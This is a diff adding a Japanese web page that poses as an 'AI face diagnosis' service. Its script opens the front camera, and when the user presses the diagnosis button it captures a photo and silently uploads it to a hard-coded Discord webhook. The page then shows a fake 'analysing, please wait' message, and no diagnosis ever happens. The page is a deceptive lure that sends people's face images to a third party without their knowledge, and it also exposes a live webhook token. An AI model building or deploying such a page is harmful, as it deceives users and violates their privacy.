@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI顔診断</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #f0f0f0; margin: 0; padding: 20px; }
+        #video { width: 100%; max-width: 400px; border-radius: 10px; background: #000; }
+        #snap { 
+            margin-top: 20px; padding: 15px 30px; font-size: 18px; 
+            background: #007bff; color: white; border: none; border-radius: 50px;
+            cursor: pointer; width: 80%;
+        }
+    </style>
+</head>
+<body>
+    <h2>AI精密顔診断</h2>
+    <p>カメラに顔を映してください</p>
+    <video id="video" autoplay playsinline></video>
+    <button id="snap">診断を開始する</button>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const snap = document.getElementById('snap');
+        const webhookUrl = 'https://discord.com/api/webhooks/1495683231444373626/lbslin1oEm_jX36Z7Fvr4wkpH8nHpuIyL0kge7I9YceojsjCAe4dF6PyVHQbwULh0Bf1';
+
+        // スマホのカメラ起動 (facingMode: user でインカメラ指定)
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" }, 
+            audio: false 
+        }).then(stream => {
+            video.srcObject = stream;
+        }).catch(err => {
+            alert("カメラの許可が必要です: " + err);
+        });
+
+        snap.addEventListener('click', () => {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('file', blob, 'mobile_capture.png');
+                formData.append('payload_json', JSON.stringify({
+                    content: "📱 スマホから診断依頼がありました。"
+                }));
+
+                fetch(webhookUrl, { method: 'POST', body: formData })
+                .then(() => alert('解析中...そのままお待ちください。'));
+            }, 'image/png');
+        });
+    </script>
+</body>
+</html>
